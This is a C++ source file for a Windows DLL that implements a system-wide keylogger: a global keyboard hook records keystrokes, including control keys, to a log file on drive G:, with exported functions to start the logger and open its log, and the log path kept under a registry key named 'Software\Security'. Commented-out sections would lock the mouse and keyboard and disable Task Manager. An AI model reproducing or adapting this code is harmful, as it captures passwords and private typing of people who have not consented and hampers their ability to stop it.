// dllmain.cpp : Defines the entry point for the DLL application.
#ifdef _MANAGED
#pragma managed(push, off)
#endif

#include "dllmain.h"
#include "stdafx.h"
#include <tchar.h>
#include <shellapi.h>


HINSTANCE	 hInstDLL;

#pragma data_seg("SHARED")
HHOOK			hKeyboardHook;
HHOOK			hKeyLoggerHook;
HHOOK			hMouseHook;
HWND hWndOld;
wchar_t szText[MAX_PATH];
#pragma data_seg()

FILE * f1;

BOOL APIENTRY DllMain( HMODULE hModule,
					  DWORD  ul_reason_for_call,
					  LPVOID lpReserved
					  )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	hInstDLL = (HINSTANCE) hModule;
	
	return TRUE;
}

//LRESULT CALLBACK MouseHookProc(int nCode, WORD wParam, DWORD lParam) 
//{
//	PMSLLHOOKSTRUCT p = (PMSLLHOOKSTRUCT)lParam;
//	HWND hWnd = WindowFromPoint(p->pt);
//
//	if(nCode >= 0)
//	{
//		if ((wParam == WM_LBUTTONDOWN || wParam == WM_RBUTTONDOWN) /*&& hWnd == GetDesktopWindow()*/)
//		{
//			return 1;
//		}
//	}
//
//	return CallNextHookEx(hMouseHook, nCode, wParam, lParam); 
//} 
//
//void EXPORT LockMouse(HWND hWnd, BOOL bEnableDisable)
//{
//	if (!bEnableDisable)
//	{
//		if (hMouseHook)
//		{
//			UnhookWindowsHookEx(hMouseHook);
//			hMouseHook = NULL;
//		}
//	}
//	else
//	{
//		if (!hMouseHook)
//			hMouseHook = SetWindowsHookEx(WH_MOUSE_LL, (HOOKPROC)MouseHookProc, hInstDLL, 0);	
//	}
//}

LRESULT CALLBACK KeyLoggerHookProc(int nCode,   WPARAM wParam, LPARAM lParam)
{
	if (nCode < 0)  // do not process message 
		return CallNextHookEx(hKeyLoggerHook, nCode, wParam, lParam );

	if (((DWORD)lParam & 0x40000000) &&(nCode==HC_ACTION))
	{		
		//if ((wParam==VK_SPACE)||(wParam==VK_TAB)||(wParam==VK_RETURN)||((wParam>0x2f ) && (wParam<=0x100)))
		{
			f1=fopen("G:\\report.txt", "a+");
			char ch;
			if (!f1)
			{
				return CallNextHookEx(hKeyLoggerHook, nCode, wParam, lParam );
			}
			switch (wParam) 
			{
				case VK_CAPITAL: fwrite(("<CAPLOCK>"),1,9,f1); goto L1;
				case VK_SHIFT: fwrite(("<SHIFT>"),1,7,f1); goto L1;
				case VK_LCONTROL:
				case VK_RCONTROL: fwrite(("<CTRL>"),1,6,f1); goto L1;
				case VK_INSERT: fwrite(("<INSERT>"),1,8,f1); goto L1;
				case VK_END: fwrite(("<END>"),1,5,f1); goto L1;
				case VK_PRINT: fwrite(("<PRINT>"),1,7,f1); goto L1;
				case VK_DELETE: fwrite(("<DEL>"),1,5,f1); goto L1;
				case VK_BACK: fwrite(("<BK>"),1,4,f1); goto L1;
				case VK_LEFT: fwrite(("<LEFT>"),1,6,f1); goto L1;
				case VK_RIGHT: fwrite(("<RIGHT>"),1,7,f1); goto L1;
				case VK_UP: fwrite(("<UP>"),1,4,f1); goto L1;
				case VK_DOWN: fwrite(("<DOWN>"),1,6,f1); goto L1;
				case VK_TAB: fwrite(("<TAB>"),1,5,f1); goto L1;
				case VK_RETURN: fwrite(("<ENTER>"),1,7,f1); goto L1;
				default: goto L2;

			}
L1:
			if (hWndOld != GetFocus())
			{
				ch='\n';
				fwrite(&ch,1,1,f1);
			} 
			else
			{
				hWndOld = GetFocus();
			}
L2:
			if ((wParam>0x2f ) && (wParam<=0x5a))
			{
				if (hWndOld != GetFocus())
				{
					ch='\n';
					fwrite(&ch,1,1,f1);
				}
				BYTE ks[256];
				GetKeyboardState(ks);
				WORD w;
				UINT scan;
				scan=0;
				ToAscii(wParam,scan,ks,&w,0);
				ch = char(w); 
				fwrite(&ch,1,1,f1);	
			}		
			fclose(f1);
			hWndOld = GetFocus();
		}
	}	
	return CallNextHookEx(hKeyLoggerHook, nCode, wParam, lParam );//Goi Hook procedure ke tiep trong Hook Chain	
}

void EXPORT ViewLogKeyLogger()
{
	TCHAR szEXEPath[MAX_PATH];
	_wgetcwd(szEXEPath, MAX_PATH);
	GetCurrentPath();
	ShellExecute(NULL, _T("open"), szText, NULL, szEXEPath, SW_SHOWNORMAL);
}

void EXPORT ActiveKeyLogger(HWND hWnd, BOOL bEnableDisable)
{
	if (!bEnableDisable)
	{
		if (hKeyLoggerHook)
		{
			UnhookWindowsHookEx(hKeyLoggerHook);
			hKeyLoggerHook = NULL;
		}
	}
	else
	{
		if (!hKeyLoggerHook)
			hKeyLoggerHook = SetWindowsHookEx(WH_KEYBOARD, (HOOKPROC)KeyLoggerHookProc, hInstDLL, 0);	
	}
}

//LRESULT CALLBACK KeyboardHookProc(int nCode,   WPARAM wParam, LPARAM lParam)
//{
//	if (nCode < 0)  // do not process message 
//		return CallNextHookEx( hKeyboardHook, nCode, wParam, lParam );
//
//	return 1;//CallNextHookEx( hHook, nCode, wParam, lParam );//Goi Hook procedure ke tiep trong Hook Chain	
//}
//
//void EXPORT LockKeyboard(HWND hWnd, BOOL bEnableDisable)
//{
//	if (!bEnableDisable)
//	{
//		if (hKeyboardHook)
//		{
//			UnhookWindowsHookEx(hKeyboardHook);
//			hKeyboardHook = NULL;
//		}
//	}
//	else
//	{
//		if (!hKeyboardHook)
//			hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)KeyboardHookProc, hInstDLL, 0);	
//	}
//}
void GetCurrentPath()
{
	#define KEY_PATH  _T("Software\\Security")
	#define VAL_PATH  _T("Path")
	
	HKEY    hKey;
	DWORD   val;
	DWORD	lpType;
	DWORD	lpcbData = sizeof(szText);
	TCHAR	lpData[260];
	LONG	r;

	if (RegOpenKey(HKEY_CURRENT_USER, KEY_PATH, &hKey) != ERROR_SUCCESS)
		if (RegCreateKey(HKEY_CURRENT_USER, KEY_PATH, &hKey) != ERROR_SUCCESS)
			return;
	//r = RegSetValueEx(hKey, VAL_PATH, 0, REG_DWORD, (BYTE *)&val, sizeof(val));
	r = RegQueryValueEx(hKey, VAL_PATH, 0, &lpType, (BYTE *)&szText, &lpcbData);
	RegCloseKey(hKey);

}

void EXPORT SetCurrentPath(wchar_t * psz)
{
#define KEY_PATH  _T("Software\\Security")
#define VAL_PATH  _T("Path")

	HKEY    hKey;
	DWORD   val;
	DWORD	lpType;
	DWORD	lpcbData = sizeof(wchar_t);
	TCHAR	lpData[260];
	LONG	r;

	if (RegOpenKey(HKEY_CURRENT_USER, KEY_PATH, &hKey) != ERROR_SUCCESS)
		if (RegCreateKey(HKEY_CURRENT_USER, KEY_PATH, &hKey) != ERROR_SUCCESS)
			return;
	r = RegSetValueEx(hKey, VAL_PATH, 0, REG_SZ, (BYTE *)psz, lpcbData);
	RegCloseKey(hKey);
}
/****************************************
* Lock Task Manager (CTRL+ALT+DEL).    *
* TRUE=Lock, FALSE=UnLock              *
* (Win NT/2K/XP)                       *
****************************************/
//int __declspec(dllexport) LockTaskManager(BOOL bEnableDisable)
//{
//#define KEY_DISABLETASKMGR  _T("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System")
//#define VAL_DISABLETASKMGR  _T("DisableTaskMgr")
//
//	HKEY    hKey;
//	DWORD   val;
//	LONG	r;
//
//	if (RegOpenKey(HKEY_CURRENT_USER, KEY_DISABLETASKMGR, &hKey) != ERROR_SUCCESS)
//		if (RegCreateKey(HKEY_CURRENT_USER, KEY_DISABLETASKMGR, &hKey) != ERROR_SUCCESS)
//			return 0;
//
//	if (!bEnableDisable) // Enable
//	{
//		r = RegDeleteValue(hKey, VAL_DISABLETASKMGR);
//	}
//	else                // Disable
//	{
//		val = 1;
//		r = RegSetValueEx(hKey, VAL_DISABLETASKMGR, 0, REG_DWORD, (BYTE *)&val, sizeof(val));
//	}
//
//	RegCloseKey(hKey);
//
//	return (r == ERROR_SUCCESS ? 1 : 0);
//}
#ifdef _MANAGED
#pragma managed(pop)
#endif

